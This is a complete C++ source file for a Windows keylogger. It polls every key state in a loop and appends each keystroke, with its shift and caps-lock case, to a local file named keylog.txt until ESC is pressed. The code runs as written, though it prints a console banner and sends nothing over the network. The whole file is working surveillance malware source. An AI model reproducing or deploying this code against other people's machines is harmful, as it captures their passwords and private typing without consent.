#include <iostream>
#include <fstream>
#include <windows.h>
using namespace std;

bool keyStates[256] = {false}; // Track if a key is currently held

void logKeystroke(int key, const string &file)
{
    ofstream logFile(file, ios::app);

    // Detect if SHIFT is pressed
    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ||
                        (GetAsyncKeyState(VK_LSHIFT) & 0x8000) ||
                        (GetAsyncKeyState(VK_RSHIFT) & 0x8000);

    // Detect if CAPS LOCK is on
    bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001);

    if (key >= 'A' && key <= 'Z')
    {
        bool upper = shiftPressed ^ capsLockOn;           // XOR: true if only one is on
        char letter = upper ? char(key) : char(key + 32); // Convert to lowercase if needed
        logFile << letter;
    }
    else if (key >= '0' && key <= '9')
    {
        if (shiftPressed)
        {
            string shiftedNums[] = {")", "!", "@", "#", "$", "%", "^", "&", "*", "("};
            logFile << shiftedNums[key - '0'];
        }
        else
        {
            logFile << char(key);
        }
    }
    else if (shiftPressed)
    {
        switch (key)
        {
        case '1':
            logFile << "!";
            return;
        case '2':
            logFile << "@";
            return;
        case '3':
            logFile << "#";
            return;
        case '4':
            logFile << "$";
            return;
        case '5':
            logFile << "%";
            return;
        case '6':
            logFile << "^";
            return;
        case '7':
            logFile << "&";
            return;
        case '8':
            logFile << "*";
            return;
        case '9':
            logFile << "(";
            return;
        case '0':
            logFile << ")";
            return;
        case VK_OEM_1:
            logFile << ":";
            return;
        case VK_OEM_2:
            logFile << "?";
            return;
        case VK_OEM_3:
            logFile << "~";
            return;
        case VK_OEM_4:
            logFile << "{";
            return;
        case VK_OEM_5:
            logFile << "|";
            return;
        case VK_OEM_6:
            logFile << "}";
            return;
        case VK_OEM_7:
            logFile << "\"";
            return;
        case VK_OEM_COMMA:
            logFile << "<";
            return;
        case VK_OEM_PERIOD:
            logFile << ">";
            return;
        case VK_OEM_MINUS:
            logFile << "_";
            return;
        case VK_OEM_PLUS:
            logFile << "+";
            return;
        }
    }
    else
    {
        switch (key)
        {
        case VK_SPACE:
            logFile << " ";
            break;
        case VK_RETURN:
            logFile << "[ENTER]\n";
            break;
        case VK_BACK:
            logFile << "[BACKSPACE]";
            break;
        case VK_TAB:
            logFile << "[TAB]";
            break;
        case VK_OEM_1:
            logFile << ";";
            break;
        case VK_OEM_2:
            logFile << "/";
            break;
        case VK_OEM_3:
            logFile << "`";
            break;
        case VK_OEM_4:
            logFile << "[";
            break;
        case VK_OEM_5:
            logFile << "\\";
            break;
        case VK_OEM_6:
            logFile << "]";
            break;
        case VK_OEM_7:
            logFile << "'";
            break;
        case VK_OEM_COMMA:
            logFile << ",";
            break;
        case VK_OEM_PERIOD:
            logFile << ".";
            break;
        case VK_OEM_MINUS:
            logFile << "-";
            break;
        case VK_OEM_PLUS:
            logFile << "=";
            break;
        // Ignored keys:
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
        case VK_ESCAPE:
        case VK_CAPITAL:
            break;
        default:
            // Uncomment to log unknown keys:
            // logFile << "[" << key << "]";
            break;
        }
    }

    logFile.close();
}

int main()
{
    string file = "keylog.txt";
    cout << "Keylogger started (press ESC to stop)...\n";

    while (true)
    {
        for (int key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) & 0x8000)
            {
                if (!keyStates[key])
                {
                    logKeystroke(key, file);
                    keyStates[key] = true;
                }
            }
            else
            {
                keyStates[key] = false;
            }
        }

        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000)
        {
            cout << "\n[ESC] pressed. Logging stopped.\n";
            break;
        }

        Sleep(10); // Delay to prevent CPU overuse
    }

    return 0;
}
